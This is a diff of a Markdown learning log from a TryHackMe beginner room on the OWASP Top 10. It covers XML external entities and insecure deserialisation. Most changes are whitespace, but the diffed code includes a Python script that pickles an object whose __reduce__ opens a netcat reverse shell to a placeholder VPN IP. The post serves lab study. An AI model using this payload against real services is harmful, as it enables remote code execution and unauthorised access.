@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-06-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-06
-
 # OWASP Top 10
 
 ## (Severity 04) XML External Entity
@@ -29,11 +24,11 @@ DTDs look very XML-like themselves. Using the actual example from TryHackMe, thi
 
 ```
 <!DOCTYPE note [
-<!ELEMENT note (to, from, heading, body)>
-<!ELEMENT to (#PCDATA)>
-<!ELEMENT from (#PCDATA)>
-<!ELEMENT heading (#PCDATA)>
-<!ELEMENT body (#PCDATA)>
+	<!ELEMENT note (to, from, heading, body)>
+	<!ELEMENT to (#PCDATA)>
+	<!ELEMENT from (#PCDATA)>
+	<!ELEMENT heading (#PCDATA)>
+	<!ELEMENT body (#PCDATA)>
 ]>
 ```
 
@@ -43,10 +38,10 @@ Defines this XML:
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE note SYSTEM "note.dtd">
 <note>
-<to>foo</to>
-<from>bar</from>
-<heading>baz</heading>
-<body>etc.</body>
+    <to>foo</to>
+    <from>bar</from>
+    <heading>baz</heading>
+    <body>etc.</body>
 </note>
 ```
 
@@ -124,15 +119,18 @@ Anyways, the TryHackMe room has us use the following code to create a malicious 
 import pickle
 import sys
 import base64
+
 command = 'rm /tmp/f; '
 command += 'mkfifo /tmp/f; '
 command += 'cat /tmp/f | '
 command += '/bin/sh -i 2>&1 | '
 command += 'netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
 class rce(object):
-def __reduce__ (self):
-import os
-return (os.system,(command,))
+    def __reduce__ (self):
+        import os
+        return (os.system,(command,))
+
 print(base64.b64encode(pickle.dumps(rce())))
 ```
 
